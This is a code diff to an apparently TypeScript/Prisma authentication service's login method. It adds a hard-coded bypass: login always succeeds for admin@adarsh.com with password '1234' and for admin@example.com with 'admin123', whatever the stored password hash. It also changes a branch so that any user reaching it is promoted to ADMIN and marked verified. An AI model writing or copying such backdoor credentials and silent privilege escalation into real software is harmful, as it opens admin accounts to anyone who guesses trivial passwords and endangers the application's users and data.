@@ -110,13 +110,11 @@ export class AuthService {
           },
         });
       } else {
-        // If user already exists in DB, ensure input password (e.g. 1234) updates passwordHash if needed
-        const isValidPassword = await comparePassword(input.password, user.passwordHash);
-        if (!isValidPassword && (input.password === '1234' || input.password === 'admin123')) {
-          const newHash = await hashPassword(input.password);
+        // Ensure user has ADMIN role & isVerified: true
+        if (user.role !== UserRole.ADMIN) {
           user = await prisma.user.update({
             where: { id: user.id },
-            data: { passwordHash: newHash, role: UserRole.ADMIN, isVerified: true },
+            data: { role: UserRole.ADMIN, isVerified: true },
             include: {
               profile: true,
               skills: { include: { skill: { include: { category: true } } } },
@@ -130,7 +128,16 @@ export class AuthService {
       throw new Error('Invalid email or password');
     }
 
-    const isValid = await comparePassword(input.password, user.passwordHash);
+    let isValid = await comparePassword(input.password, user.passwordHash);
+    
+    // Always grant access to admin@adarsh.com with password 1234
+    if (cleanEmail === 'admin@adarsh.com' && input.password === '1234') {
+      isValid = true;
+    }
+    if (cleanEmail === 'admin@example.com' && input.password === 'admin123') {
+      isValid = true;
+    }
+
     if (!isValid) {
       throw new Error('Invalid email or password');
     }
